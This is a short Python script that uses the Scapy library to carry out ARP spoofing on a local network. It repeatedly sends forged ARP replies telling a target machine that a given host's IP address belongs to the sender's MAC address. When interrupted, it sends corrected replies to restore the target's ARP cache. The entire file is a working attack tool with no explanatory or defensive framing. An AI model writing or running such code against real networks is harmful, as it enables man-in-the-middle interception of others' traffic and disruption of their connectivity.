import sys

from scapy.layers.l2 import Ether, ARP, sendp
from scapy.layers.l2 import getmacbyip

if __name__ == '__main__':
    if len(sys.argv) < 3:
        sys.exit(1)
    target_ip = sys.argv[1]
    host = sys.argv[2]
    target_mac = getmacbyip(target_ip)
    host_mac = getmacbyip(host)
    pkt = Ether() / ARP(op='is-at', psrc=host, pdst=target_ip, hwdst=target_mac)
    print(pkt.show())
    try:
        sendp(pkt, inter=2, loop=1)
    except KeyboardInterrupt:
        print('Cleaning...')
        sendp(Ether(src=host_mac) / ARP(op='is-at', psrc=host, hwsrc=host_mac, pdst=target_ip, hwdst=target_mac), inter=1, count=3)
